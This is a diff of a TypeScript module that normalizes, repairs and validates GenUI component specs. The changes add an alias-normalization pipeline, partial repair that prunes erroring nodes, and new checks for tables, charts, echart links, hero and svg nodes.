+  // spec, so this recursion cannot wrap twice (issue #172).
+  if (isComponentRoot(value)) {
     const wrapped = wrapSingleComponentRoot(value)
     if (wrapped === null) return null
-    return repairGenuiSpec(wrapped)
+    return repairCanonicalGenuiSpec(wrapped)
   }
+  if (!Array.isArray(v.items)) return null
   const ctx: RepairCtx = { remaining: GENUI_LIMITS.maxNodes }
   return {
     ...opt('title', str(v.title, GENUI_LIMITS.maxString)),
@@ -1126,6 +1203,20 @@ export function repairGenuiSpec(value: unknown): GenuiSpec | null {
     ...opt('append', v.append === true ? true : undefined),
     items: repairItems(v.items, ctx, 0),
   }
+}
+
+/**
+ * Deterministically repair a raw spec into a renderable GenuiSpec.
+ *
+ * Alias normalization is performed before the existing resource, type, and
+ * security repair rules. The result remains idempotent and keeps the legacy
+ * public API used by the fence renderer and client components.
+ *
+ * @param value - Raw GenUI spec or bare component.
+ * @returns Repaired canonical spec, or null for an invalid root.
+ */
+export function repairGenuiSpec(value: unknown): GenuiSpec | null {
+  return repairCanonicalGenuiSpec(normalizeGenuiSpec(value).value)
 }
 
 /* ---------------- validation ---------------- */
@@ -1164,8 +1255,8 @@ export function countGenuiNodes(value: unknown, cap = Number.POSITIVE_INFINITY):
         // Layout containers hold real children; skipping them undercounted
         // the tree and hid silent drops from validate_dsh_ui (issue #42).
         walk(v.items)
-      } else if (v.type === 'file-tree' && Array.isArray(v.items)) {
-        walk(v.items)
+      } else if (v.type === 'file-tree') {
+        // file-tree.items are data records, not GenUI children.
       } else if (v.type === 'list' && Array.isArray(v.items)) {
         // Typed list children are nodes too (repair charges them against the
         // budget); strings and {title,desc} shapes are skipped.
@@ -1173,6 +1264,13 @@ export function countGenuiNodes(value: unknown, cap = Number.POSITIVE_INFINITY):
           if (count >= cap) return
           const lo = obj(li)
           if (lo !== undefined && typeof lo.type === 'string') walk([lo])
+        }
+      } else if (v.type === 'table' && Array.isArray(v.details)) {
+        const rowCount = tableRowsForDetails(v).length
+        for (let rowIndex = 0; rowIndex < Math.min(v.details.length, rowCount); rowIndex++) {
+          if (count >= cap) return
+          const detail = v.details[rowIndex]
+          if (Array.isArray(detail) && isTableDetailReachable(v, rowIndex)) walk(detail)
         }
       }
     }
@@ -1185,13 +1283,7 @@ export function countGenuiNodes(value: unknown, cap = Number.POSITIVE_INFINITY):
 /** Every white-listed node `type`. Keep in sync with the repairNode switch —
  * validate_dsh_ui uses it to tell declared GenUI nodes apart from unrelated
  * `"type"` strings (e.g. file-tree's `{type:'file'}` children). */
-export const GENUI_NODE_TYPES: ReadonlySet<string> = new Set([
-  'accordion', 'audio', 'avatar', 'badge', 'breadcrumb', 'button', 'callout', 'card', 'chart',
-  'checkbox', 'code', 'col', 'copy', 'diff', 'divider', 'file-tree', 'grid', 'image', 'input', 'json',
-  'keyvalue', 'link', 'list', 'mermaid', 'plot', 'progress', 'quiz', 'radio', 'row', 'scene3d',
-  'select', 'slider', 'spacer', 'stat', 'steps', 'submit', 'switch', 'table', 'tabs', 'text',
-  'textarea', 'timeline', 'video', 'echart', 'diagram',
-])
+export const GENUI_NODE_TYPES: ReadonlySet<string> = GENUI_NATIVE_TYPES
 
 /**
  * Visit and count declared nodes in a raw spec tree: objects whose `type` is a
@@ -1236,6 +1328,11 @@ function visitDeclaredGenuiNodes(
       for (let row = 0; row < v.items.length; row++) {
         walkNode(v.items[row], `${at}.items[${row}]`)
       }
+    } else if (v.type === 'table' && Array.isArray(v.details)) {
+      const rowCount = tableRowsForDetails(v).length
+      for (let row = 0; row < Math.min(v.details.length, rowCount); row++) {
+        if (Array.isArray(v.details[row]) && isTableDetailReachable(v, row)) walk(v.details[row], `${at}.details[${row}]`)
+      }
     }
   }
   function walkItemsOf(holder: unknown, path: string): void {
@@ -1247,8 +1344,9 @@ function visitDeclaredGenuiNodes(
   }
   const root = obj(value)
   if (root === undefined) return count
-  // Single-component root (no items array): the root itself is the declared node.
-  if (!Array.isArray(root.items) && declared(value)) walkNode(value, 'spec')
+  // Component root: the root itself is the declared node, whether or not it
+  // carries an `items` data array (issue #172).
+  if (isComponentRoot(root) && declared(value)) walkNode(value, 'spec')
   else walk(root.items, 'items')
   return count
 }
@@ -1261,6 +1359,11 @@ function visitDeclaredGenuiNodes(
  */
 export function countDeclaredGenuiNodes(value: unknown, cap = Number.POSITIVE_INFINITY): number {
   return visitDeclaredGenuiNodes(value, cap, () => {})
+}
+
+/** Count native nodes that survived repair, excluding opaque custom nodes. */
+export function countRenderedNativeGenuiNodes(value: unknown, cap = Number.POSITIVE_INFINITY): number {
+  return countDeclaredGenuiNodes(value, cap)
 }
 
 /**
@@ -1283,20 +1386,23 @@ export function validateGenuiChartSemantics(value: unknown): string[] {
  * diagnostic for tests and tooling. Unknown `type`s are reported (a plugin
  * custom type is valid only when a renderer is registered — the guard cannot
  * know, so it flags them as warnings).
+ *
+ * @param value - 未经过别名转换的 GenUI 文档。
+ * @returns 完整结构与字段校验结果。
  */
-export function validateGenuiSpec(value: unknown): GenuiValidation {
+export function validateCanonicalGenuiSpec(value: unknown): GenuiValidation {
   const errors: string[] = []
   const v = obj(value)
   if (v === undefined) return { ok: false, errors: ['spec root must be an object'] }
-  if (!Array.isArray(v.items)) {
-    // Single-component root: validate through the wrapped form so the tool
-    // agrees with the renderer about what is a valid fence body.
+  // Single-component root: validate through the wrapped form so the tool
+  // agrees with the renderer about what is a valid fence body.
+  if (isComponentRoot(value)) {
     const wrapped = wrapSingleComponentRoot(value)
-    if (wrapped !== null) return validateGenuiSpec(wrapped)
+    if (wrapped !== null) return validateCanonicalGenuiSpec(wrapped)
     return { ok: false, errors: ['spec.items must be an array'] }
   }
-  if (v.title !== undefined && typeof v.title !== 'string') errors.push('spec.title must be a string')
-  if (v.gap !== undefined && (typeof v.gap !== 'number' || !Number.isFinite(v.gap))) errors.push('spec.gap must be a finite number')
+  if (!Array.isArray(v.items)) return { ok: false, errors: ['spec.items must be an array'] }
+  validateSchemaFieldKinds(v, 'spec', GENUI_SPEC_SCHEMA, errors, ['items'])
   let count = 0
   let capped = false
   const walk = (list: unknown, depth: number, path: string): void => {
@@ -1319,7 +1425,222 @@ export function validateGenuiSpec(value: unknown): GenuiValidation {
     }
   }
   walk(v.items, 0, 'items')
-  return { ok: errors.length === 0, errors }
+  if (errors.length === 0) errors.push(...analyzeSubmissionRegistry(v as unknown as GenuiSpec).diagnostics)
+  const uniqueErrors = [...new Set(errors)]
+  return { ok: uniqueErrors.length === 0, errors: uniqueErrors }
+}
+
+/**
+ * Validate a raw GenUI value after deterministic alias normalization.
+ *
+ * Validation therefore only sees canonical fields; repairable aliases do not
+ * produce false required-field errors. Structural and semantic defects remain
+ * errors, while native unknown fields are exposed by the warning diagnostics
+ * returned from `processGenuiSpec`.
+ *
+ * @param value - Raw GenUI spec or bare component.
+ * @returns Validation result with human-readable errors.
+ */
+export function validateGenuiSpec(value: unknown): GenuiValidation {
+  return validateCanonicalGenuiSpec(normalizeGenuiSpec(value).value)
+}
+
+export interface GenuiProcessResult {
+  /** Canonical alias-normalized input value. */
+  value: unknown
+  /** Alias-normalized value, provided as an explicit descriptive alias. */
+  normalized: unknown
+  /** Canonical repaired value consumed by the renderer. */
+  repaired: GenuiSpec | null
+  /** Renderer-facing alias for `repaired`. */
+  spec: GenuiSpec | null
+  /** Structural and semantic validation errors. */
+  errors: string[]
+  /** Alias and native unknown-field warnings. */
+  warnings: GenuiDiagnostic[]
+  /** Native nodes declared in the canonical input, before repair drops. */
+  declaredCount: number
+  /** Nodes present in the repaired tree. */
+  renderedCount: number
+  /** Native nodes declared before repair, excluding custom payloads. */
+  declaredNativeCount: number
+  /** Native nodes present after repair, excluding custom and file-tree data. */
+  renderedNativeCount: number
+  /** All rendered component nodes, including opaque custom nodes. */
+  renderedTotalCount: number
+}
+
+/**
+ * Run the shared canonical GenUI pipeline.
+ *
+ * The pipeline normalizes aliases, applies the existing deterministic repair
+ * and security filters, validates the canonical input, and reports native
+ * declarations that disappeared during repair. Custom nodes stay opaque and
+ * do not participate in native unknown-field diagnostics.
+ *
+ * @param value - Raw GenUI spec or bare component.
+ * @returns Canonical input, repaired output, diagnostics, and node counts.
+ */
+export function processGenuiSpec(value: unknown): GenuiProcessResult {
+  const normalized = normalizeGenuiSpec(value)
+  const repaired = repairCanonicalGenuiSpec(normalized.value)
+  const validation = validateCanonicalGenuiSpec(normalized.value)
+  const declaredNativeCount = countDeclaredGenuiNodes(normalized.value, GENUI_LIMITS.maxNodes + 1)
+  const renderedNativeCount = repaired === null ? 0 : countRenderedNativeGenuiNodes(repaired)
+  const renderedTotalCount = repaired === null ? 0 : countGenuiNodes(repaired)
+  // The shared public validator preserves its historical diagnostic for an
+  // unknown type. The processing pipeline is renderer-aware by contract:
+  // custom nodes stay opaque and must not fail native schema validation.
+  const errors = validation.errors.filter(error => !error.includes(': unknown type '))
+  if (repaired !== null && errors.length === 0) {
+    errors.push(...analyzeSubmissionRegistry(repaired).diagnostics)
+  }
+  if (declaredNativeCount > renderedNativeCount) {
+    errors.push(`repair dropped ${declaredNativeCount - renderedNativeCount} declared native node(s): declared ${declaredNativeCount}, rendered ${renderedNativeCount}`)
+  }
+  return {
+    value: normalized.value,
+    normalized: normalized.value,
+    repaired,
+    spec: repaired,
+    errors: [...new Set(errors)],
+    warnings: [...normalized.warnings, ...diagnoseUnknownGenuiFields(normalized.value)],
+    // Compatibility fields retain their historical meanings: declaredCount
+    // is native declarations, while renderedCount is the total rendered tree.
+    declaredCount: declaredNativeCount,
+    renderedCount: renderedTotalCount,
+    declaredNativeCount,
+    renderedNativeCount,
+    renderedTotalCount,
+  }
+}
+
+/** Return whether the only process errors describe an intentional budget tail cut. */
+export function isIntentionalBudgetCut(processed: GenuiProcessResult): boolean {
+  return processed.errors.length > 0
+    && processed.errors.every(error => error.startsWith('spec exceeds ') || error.startsWith('repair dropped '))
+    && processed.renderedNativeCount === GENUI_LIMITS.maxNodes
+    && processed.declaredNativeCount === GENUI_LIMITS.maxNodes + 1
+}
+
+/** Decide whether a repaired spec is safe to expose to any GenUI renderer. */
+export function isRenderableProcess(processed: GenuiProcessResult): boolean {
+  return processed.spec !== null && (processed.errors.length === 0 || isIntentionalBudgetCut(processed))
+}
+
+/* ---------------- partial fence rendering (issue #186) ---------------- */
+
+/** Longest node or aligned table-detail slot path a validation error points at. */
+const DECLARED_NODE_PATH_RE = /^(items\[\d+\](?:\.(?:items\[\d+\]|tabs\[\d+\]\.items\[\d+\]|details\[\d+\](?:\[\d+\])?))*)/
+
+function errorNodePath(error: string): string | null {
+  const match = DECLARED_NODE_PATH_RE.exec(error)
+  return match === null ? null : match[1] ?? null
+}
+
+interface NodeSlot {
+  array: unknown[]
+  index: number
+  /** Detail row slots align with table rows; pruning must not shift them. */
+  preserveIndex: boolean
+}
+
+/** Where the node or table-detail slot at a validation path lives. */
+function nodeSlotAt(root: Record<string, unknown>, path: string): NodeSlot | undefined {
+  const steps = [...path.matchAll(/(?:^|\.)(items|tabs|details)\[(\d+)\]|\[(\d+)\]/g)]
+  if (steps.length === 0 || steps[steps.length - 1]![1] === 'tabs') return undefined
+  let current: unknown = root
+  for (let i = 0; i < steps.length; i++) {
+    const step = steps[i]!
+    // A detail child has a second index without a property: details[row][node].
+    const list = step[1] === undefined ? current : obj(current)?.[step[1]]
+    const index = Number(step[2] ?? step[3])
+    if (!Array.isArray(list) || index >= list.length) return undefined
+    if (i === steps.length - 1) return { array: list, index, preserveIndex: step[1] === 'details' }
+    current = list[index]
+    if (current === undefined) return undefined
+  }
+  return undefined
+}
+
+/** Deep-clone a JSON value for pruning; null when it cannot round-trip. */
+function cloneJsonValue(value: unknown): Record<string, unknown> | null {
+  try {
+    return obj(JSON.parse(JSON.stringify(value))) ?? null
+  } catch {
+    return null
+  }
+}
+
+/**
+ * Best-effort repair for a spec whose strict validation failed: drop the
+ * declared nodes the errors point at and re-run the whole pipeline once.
+ *
+ * The fence channels call this after the strict gate refuses, so ONE bad
+ * component no longer degrades the whole fence to a code block — the
+ * behaviour the capability map documents ("坏节点静默丢弃…不会拖垮界面") and
+ * that validate_dsh_ui keeps diagnosing for the model. Bounded to a single
+ * retry: a second failing pass is a genuinely pathological tree and keeps
+ * today's full-fence fallback. Chart semantics stay protected the same way —
+ * an undrawable chart is DROPPED here, never repaired into a blank canvas.
+ */
+export function partialRepairGenuiSpec(processed: GenuiProcessResult): GenuiSpec | null {
+  if (isRenderableProcess(processed)) return processed.spec
+  if (processed.spec === null) return null
+  const root = obj(processed.value)
+  if (root === undefined) return null
+  const paths = new Set<string>()
+  const overhangPaths = new Set<string>()
+  for (const error of processed.errors) {
+    if (error.startsWith('spec exceeds ')) continue
+    const nodePath = errorNodePath(error)
+    if (nodePath === null) continue
+    if (error === `${nodePath}.details must not contain more entries than rows`) {
+      overhangPaths.add(nodePath)
+    } else paths.add(nodePath)
+  }
+  if (paths.size === 0 && overhangPaths.size === 0) return null
+  // Validation wraps a bare component first. Prune the same shape so its
+  // detail paths resolve even when the table is the only declared node.
+  const pruned = cloneJsonValue(isComponentRoot(root) ? wrapSingleComponentRoot(root) : root)
+  if (pruned === null) return null
+  // Resolve every slot BEFORE the first splice: each drop shifts the later
+  // siblings of the same array, so a resolve-after-splice (deepest-first or
+  // not) lands on the wrong row whenever two erroring nodes share a parent.
+  // A resolved slot keeps its own array reference, so a parent drop cannot
+  // invalidate an already-resolved child slot; per array, splicing
+  // highest-index first keeps the remaining indexes valid (issue #190).
+  const slots = [...paths]
+    .map((path) => nodeSlotAt(pruned, path))
+    .filter((slot): slot is NodeSlot => slot !== undefined)
+  const overhangSlots = [...overhangPaths]
+    .map((path) => nodeSlotAt(pruned, path))
+    .filter((slot): slot is NodeSlot => slot !== undefined)
+  // Extra details are unreachable. Mirror table repair's existing truncation
+  // only for this exact diagnostic, then validate the whole candidate again.
+  for (const { array, index } of overhangSlots) {
+    const table = obj(array[index])
+    if (table?.type === 'table' && Array.isArray(table.details)) {
+      table.details.length = Math.min(table.details.length, tableRowsForDetails(table).length)
+    }
+  }
+  const byArray = new Map<unknown[], number[]>()
+  for (const { array, index, preserveIndex } of slots) {
+    if (preserveIndex) {
+      array[index] = null
+      continue
+    }
+    const indexes = byArray.get(array)
+    if (indexes === undefined) byArray.set(array, [index])
+    else indexes.push(index)
+  }
+  for (const [array, indexes] of byArray) {
+    indexes.sort((a, b) => b - a)
+    for (const index of indexes) array.splice(index, 1)
+  }
+  const retry = processGenuiSpec(pruned)
+  if (!isRenderableProcess(retry) || retry.renderedNativeCount === 0) return null
+  return retry.spec
 }
 
 type Walker = (list: unknown, depth: number, path: string) => void
@@ -1373,8 +1694,52 @@ function validateChartNode(v: Record<string, unknown>, at: string, errors: strin
       || !CHART_KINDS.includes(v.kind as typeof CHART_KINDS[number]))) {
     errors.push(`${at}.kind must be bars, line, or donut`)
   }
+  const kind = v.kind === undefined ? 'bars' : v.kind
+  const series = Array.isArray(v.series) ? v.series : undefined
+  // Grouped bars legitimately carry `data: []` and keep every point in
+  // `series`; only an empty data array with NO series is undrawable.
+  if (Array.isArray(v.data) && v.data.length === 0 && (series === undefined || series.length === 0)) {
+    errors.push(`${at}.data must not be empty`)
+  }
+  if (series !== undefined) {
+    if (series.length === 0) errors.push(`${at}.series must not be empty`)
+    // A line chart accepts `series` (one line per entry); the donut is a
+    // share-of-total shape and stays single-series.
+    if (kind === 'donut') errors.push(`${at}.series is only supported for bars and line`)
+    for (let index = 0; index < series.length; index++) {
+      const entry = obj(series[index])
+      if (entry !== undefined && Array.isArray(entry.data) && entry.data.length === 0) {
+        errors.push(`${at}.series[${index}].data must not be empty`)
+      }
+    }
+  }
+  if (kind === 'donut' && v.data === undefined) {
+    errors.push(`${at}.data is required for donut`)
+  }
+  if (kind === 'line' && v.data === undefined && (series === undefined || series.length === 0)) {
+    errors.push(`${at}.data is required for line (or provide series)`)
+  }
   validateChartData(v.data, `${at}.data`, errors)
   validateChartSeries(v.series, `${at}.series`, errors)
+}
+
+/** Validate table rows before repair can silently remove malformed cells. */
+function validateTableRows(value: unknown, at: string, errors: string[]): void {
+  if (!Array.isArray(value)) return
+  for (let rowIndex = 0; rowIndex < value.length; rowIndex++) {
+    const row = value[rowIndex]
+    if (obj(row) !== undefined) continue
+    if (!Array.isArray(row)) {
+      errors.push(`${at}[${rowIndex}] must be an array or object`)
+      continue
+    }
+    for (let cellIndex = 0; cellIndex < row.length; cellIndex++) {
+      const cell = row[cellIndex]
+      if (typeof cell !== 'string' && (typeof cell !== 'number' || !Number.isFinite(cell))) {
+        errors.push(`${at}[${rowIndex}][${cellIndex}] must be a string or finite number`)
+      }
+    }
+  }
 }
 
 function validateNode(value: unknown, depth: number, at: string, errors: string[], walk: Walker): void {
@@ -1429,9 +1794,7 @@ function validateNode(value: unknown, depth: number, at: string, errors: string[
       break
     case 'submit':
       if (typeof v.label !== 'string') errors.push(`${at}: type 'submit' requires label (string)`)
-      // action is optional (local grading needs no round trip); the
-      // renderer disables the button when it is absent AND no question
-      // carries local `answer` data.
+      // 本地判卷可以不设置 action；不满足判卷条件时，渲染器会禁用无 action 的按钮。
       break
     case 'badge':
       if (typeof v.label !== 'string' && typeof v.text !== 'string' && typeof v.value !== 'string') {
@@ -1440,6 +1803,10 @@ function validateNode(value: unknown, depth: number, at: string, errors: string[
       isStr('label')
       isStr('text')
       isStr('value')
+      break
+    case 'hero':
+      if (typeof v.title !== 'string') errors.push(`${at}: type 'hero' requires title (string)`)
+      isStr('subtitle')
       break
     case 'stat':
       if (typeof v.label !== 'string') errors.push(`${at}: type 'stat' requires label (string)`)
@@ -1470,8 +1837,32 @@ function validateNode(value: unknown, depth: number, at: string, errors: string[
       }
       break
     case 'table':
-      if (!Array.isArray(v.columns)) errors.push(`${at}: type 'table' requires columns (array)`)
+      // `columns` may be satisfied by the 2D body itself (repair derives the
+      // header from the leading row); only a body that cannot state its
+      // columns is a contract error.
+      if (!Array.isArray(v.columns) && !hasDerivableTableColumns(v)) errors.push(`${at}: type 'table' requires columns (array)`)
       if (!Array.isArray(v.rows)) errors.push(`${at}: type 'table' requires rows (array)`)
+      if (v.types !== undefined && !Array.isArray(v.types)) {
+        errors.push(`${at}.types must be an array of column cell types`)
+      }
+      if (v.details !== undefined && !Array.isArray(v.details)) {
+        errors.push(`${at}.details must be an array aligned with rows`)
+      }
+      if (Array.isArray(v.details)) {
+        const table = { columns: v.columns, rows: v.rows, types: v.types }
+        const rowCount = tableRowsForDetails(table).length
+        if (v.details.length > rowCount) errors.push(`${at}.details must not contain more entries than rows`)
+        for (let i = 0; i < Math.min(v.details.length, rowCount); i++) {
+          const detail = v.details[i]
+          if (detail === null || !isTableDetailReachable(table, i)) continue
+          if (!Array.isArray(detail)) {
+            errors.push(`${at}.details[${i}] must be an array or null`)
+            continue
+          }
+          walk(detail, depth + 1, `${at}.details[${i}]`)
+        }
+      }
+      validateTableRows(v.rows, `${at}.rows`, errors)
       break
     case 'chart':
       validateChartNode(v, at, errors)
@@ -1523,6 +1914,10 @@ function validateNode(value: unknown, depth: number, at: string, errors: string[
     case 'copy':
       if (typeof v.text !== 'string') errors.push(`${at}: type 'copy' requires text (string)`)
       break
+    case 'svg':
+      if (typeof v.code !== 'string') errors.push(`${at}: type 'svg' requires code (string)`)
+      isNum('height')
+      break
     case 'mermaid':
       if (typeof v.code !== 'string') errors.push(`${at}: type 'mermaid' requires code (string)`)
       break
@@ -1549,8 +1944,12 @@ function validateNode(value: unknown, depth: number, at: string, errors: string[
       break
 
     case 'echart':
-      if (v.option === undefined && v.data === undefined && v.series === undefined) {
-        errors.push(`${at}: type 'echart' requires option, data, or series`)
+      // `links` alone is a valid payload: the sankey/graph presets are driven
+      // by edges only. Missing it here rejected the whole fence as
+      // un-renderable (the render gate turns any error into "render nothing").
+      if (v.option === undefined && v.data === undefined && v.series === undefined
+        && (!Array.isArray(v.links) || v.links.length === 0)) {
+        errors.push(`${at}: type 'echart' requires option, data, series, or links`)
       }
       isNum('height')
       break
@@ -1558,5 +1957,9 @@ function validateNode(value: unknown, depth: number, at: string, errors: string[
       // Unknown type: plugin-registered custom nodes are valid when a
       // renderer exists; the guard cannot know, so report as a warning.
       errors.push(`${at}: unknown type '${type}' (custom renderer?)`)
+  }
+  const definition = COMPONENT_SCHEMAS[type]
+  if (definition !== undefined) {
+    validateRegistryFields(v, at, definition, errors)
   }
 }
